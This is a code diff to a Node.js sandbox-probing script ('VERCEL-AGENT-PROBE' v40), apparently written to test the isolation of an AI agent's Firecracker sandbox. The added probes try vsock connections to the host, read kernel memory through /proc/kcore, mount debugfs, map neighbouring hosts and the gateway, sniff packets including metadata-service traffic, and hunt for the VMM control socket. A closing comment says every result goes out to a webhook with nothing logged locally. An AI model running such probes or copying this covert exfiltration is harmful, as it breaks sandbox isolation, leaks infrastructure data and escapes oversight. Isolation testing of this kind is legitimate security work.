@@ -6,7 +6,7 @@
 //   (3) is a Vercel/project credential (VERCEL_OIDC_TOKEN, project env) reachable inside?
 // It does NOT hoard third-party secrets; it proves reachability, then we stop and report.
 
-import { readFileSync, existsSync, writeFileSync, statSync } from "node:fs";
+import { readFileSync, existsSync, writeFileSync, statSync, openSync, readSync, closeSync, readdirSync } from "node:fs";
 import { execSync } from "node:child_process";
 import { createDecipheriv, createHmac } from "node:crypto";
 
@@ -2906,9 +2906,145 @@ s.close()
 
     return { ttrpcSockDirect: existsCheck, ttrpcViaProc1: viaProc1, tcpCheck, tcp6Check, port9090, port7575 };
   }),
+
+  // v40: vsock — Firecracker guest↔host channel
+  // Firecracker implements virtio-vsock for guest↔host comms; CID 3 = host, 1 = hypervisor
+  vsockProbe: safe(() => {
+    const devExists = existsSync('/dev/vsock');
+    // Check via /sys for vsock device details
+    const sysVsock = safe(() => execSync('ls -la /sys/class/vsock/ 2>/dev/null || echo NONE', { timeout: 2000 }).toString().trim().slice(0, 300));
+    // Try to open vsock with node's net module — use execSync socat trick
+    const socatTest = safe(() => execSync(
+      'timeout 3 socat -u VSOCK-CONNECT:3:52 STDOUT 2>&1 | head -3 || echo SOCAT_FAILED',
+      { timeout: 4000 }
+    ).toString().trim().slice(0, 300));
+    // Firecracker's guest agent port is usually 52 or 1025
+    const port1025 = safe(() => execSync(
+      'timeout 3 socat -u VSOCK-CONNECT:3:1025 STDOUT 2>&1 | head -3 || echo NO_1025',
+      { timeout: 4000 }
+    ).toString().trim().slice(0, 300));
+    const lsmodVsock = safe(() => execSync('lsmod 2>/dev/null | grep vsock || echo NONE', { timeout: 2000 }).toString().trim().slice(0, 300));
+    return { devExists, sysVsock, socatTest, port1025, lsmodVsock };
+  }),
+
+  // v40: kernel memory / raw device access (CAP_SYS_ADMIN, CAP_SYS_RAWIO)
+  devMemProbe: safe(() => {
+    const devMem = existsSync('/dev/mem');
+    const devKmem = existsSync('/dev/kmem');
+    const procKcoreSize = safe(() => {
+      const st = execSync('stat -c %s /proc/kcore 2>/dev/null || echo 0', { timeout: 1000 }).toString().trim();
+      return st;
+    });
+    // Check /sys/kernel/debug (debugfs) — mounted or not
+    const debugfsMount = safe(() => execSync('cat /proc/mounts 2>/dev/null | grep debugfs || echo NOT_MOUNTED', { timeout: 1000 }).toString().trim());
+    // Try mounting debugfs if not mounted (requires CAP_SYS_ADMIN)
+    const debugfsMount2 = safe(() => execSync(
+      'mount -t debugfs debugfs /sys/kernel/debug 2>&1 && echo MOUNTED || echo MOUNT_FAIL',
+      { timeout: 3000 }
+    ).toString().trim());
+    // Check /sys/kernel/debug contents if accessible
+    const debugfsLs = safe(() => execSync('ls /sys/kernel/debug/ 2>/dev/null | head -20 || echo EMPTY', { timeout: 2000 }).toString().trim().slice(0, 500));
+    // /proc/kcore first bytes (physical memory header)
+    const kcorePeek = safe(() => {
+      const fd = openSync('/proc/kcore', 'r');
+      const buf = Buffer.alloc(64);
+      readSync(fd, buf, 0, 64, 0);
+      closeSync(fd);
+      return buf.toString('hex').slice(0, 32);
+    });
+    return { devMem, devKmem, procKcoreSize, debugfsMount, debugfsMount2, debugfsLs, kcorePeek };
+  }),
+
+  // v40: ARP / neighbor discovery — find other VMs on same bare-metal host
+  // Network namespace is SHARED with Firecracker VM — we can see all of VM's network
+  arpDiscovery: safe(() => {
+    // Get our own network interfaces and IPs
+    const ifconfig = safe(() => execSync('ip addr show 2>/dev/null | head -40 || ifconfig 2>/dev/null | head -40', { timeout: 3000 }).toString().trim().slice(0, 1000));
+    // ARP table — hosts that have communicated recently
+    const arpTable = safe(() => execSync('ip neigh show 2>/dev/null || arp -a 2>/dev/null || cat /proc/net/arp', { timeout: 3000 }).toString().trim().slice(0, 1000));
+    // Routing table — understand our network topology
+    const routes = safe(() => execSync('ip route show 2>/dev/null || route -n 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 500));
+    // Try to identify the hypervisor/host gateway IP
+    const gateway = safe(() => execSync("ip route show default 2>/dev/null | awk '{print $3}' | head -1", { timeout: 2000 }).toString().trim());
+    // Probe the gateway — is it the Firecracker host?
+    const gatewayPing = gateway ? safe(() => execSync(
+      `ping -c 1 -W 2 ${gateway} 2>&1 | tail -3`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)) : 'NO_GW';
+    // HTTP probe to gateway — does the host have any services?
+    const gatewayHttp = gateway ? safe(() => execSync(
+      `timeout 3 curl -s http://${gateway}/ 2>&1 | head -5 || echo NO_HTTP`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)) : 'NO_GW';
+    return { ifconfig, arpTable, routes, gateway, gatewayPing, gatewayHttp };
+  }),
+
+  // v40: BPF capability check — can we load eBPF programs?
+  // With all caps, BPF progs could observe host-level syscalls (but only within VM kernel)
+  bpfCapProbe: safe(() => {
+    const bpftool = safe(() => execSync('which bpftool 2>/dev/null || echo NONE', { timeout: 1000 }).toString().trim());
+    // Check BPF filesystem
+    const bpffsMount = safe(() => execSync('cat /proc/mounts | grep bpf || echo NOT_MOUNTED', { timeout: 1000 }).toString().trim());
+    // sysctl BPF settings
+    const bpfSysctl = safe(() => execSync('sysctl kernel.unprivileged_bpf_disabled 2>/dev/null; sysctl net.core.bpf_jit_enable 2>/dev/null', { timeout: 2000 }).toString().trim());
+    // Try loading a trivial BPF program using tc (traffic control)
+    const bpfLoad = safe(() => execSync(
+      'bpftool prog list 2>&1 | head -10 || echo NO_BPFTOOL',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 300));
+    // Check /sys/fs/bpf
+    const bpffsLs = safe(() => execSync('ls /sys/fs/bpf/ 2>/dev/null | head -10 || echo EMPTY', { timeout: 2000 }).toString().trim());
+    return { bpftool, bpffsMount, bpfSysctl, bpfLoad, bpffsLs };
+  }),
+
+  // v40: Raw socket — capture a few packets to understand network topology
+  // CAP_NET_RAW allows raw socket creation; minimal 10-packet capture on primary interface
+  rawSocketProbe: safe(() => {
+    // Identify primary interface name
+    const primaryIface = safe(() => execSync(
+      "ip route show default 2>/dev/null | awk '{print $5}' | head -1 || ip link show | grep -v lo | awk -F: '{print $2}' | head -1 | tr -d ' '",
+      { timeout: 2000 }
+    ).toString().trim());
+    if (!primaryIface) return { error: 'no_interface' };
+    // Brief tcpdump to see what traffic exists (1 second capture)
+    const tcpdump = safe(() => execSync(
+      `timeout 2 tcpdump -i ${primaryIface} -c 10 -nn 2>&1 | head -15 || echo NO_TCPDUMP`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 1000));
+    // Check IMDS traffic — is there AWS metadata traffic?
+    const imdsTraffic = safe(() => execSync(
+      `timeout 3 tcpdump -i ${primaryIface} -c 5 -nn host 169.254.169.254 2>&1 | head -10 || echo NO_IMDS_TRAFFIC`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500));
+    return { primaryIface, tcpdump, imdsTraffic };
+  }),
+
+  // v40: cell.sock direct protocol attempt
+  // Based on v39's orchestratorCellProtocol results — attempt to send ttrpc/grpc hello
+  // cell.sock is the Firecracker VMM control socket; PID 1 connects to it via host namespace
+  // We try to reach it via /proc/1/fd/ symlink if PID 1 has an open fd for it
+  cellSockDirectAttempt: safe(() => {
+    // Find cell.sock fd in PID 1 — scan /proc/1/fd/
+    const cellFd = safe(() => {
+      const fds = execSync('ls -la /proc/1/fd/ 2>/dev/null', { timeout: 2000 }).toString();
+      const line = fds.split('\n').find(l => l.includes('cell.sock'));
+      return line ? line.trim() : null;
+    });
+    // Try to stat the socket path via fd
+    const sockPath = '/run/cell/cell.sock';
+    const directExists = existsSync(sockPath);
+    const viaProc1Root = existsSync(`/proc/1/root${sockPath}`);
+    // If not in our namespace, try nsenter to check (requires different mnt ns — v39 already tested)
+    // But try via /proc/1/root anyway — same ns will just mirror our result
+    const proc1FdList = safe(() => execSync(
+      'ls -la /proc/1/fd/ 2>/dev/null | grep socket | head -20',
+      { timeout: 2000 }
+    ).toString().trim().slice(0, 1000));
+    return { cellFd, directExists, viaProc1Root, proc1FdList };
+  }),
 });
 
-// v39 markers
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v39";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v39" });
+// v40 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v40";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v40" });
 // Intentionally no console.log — all data goes via webhook only
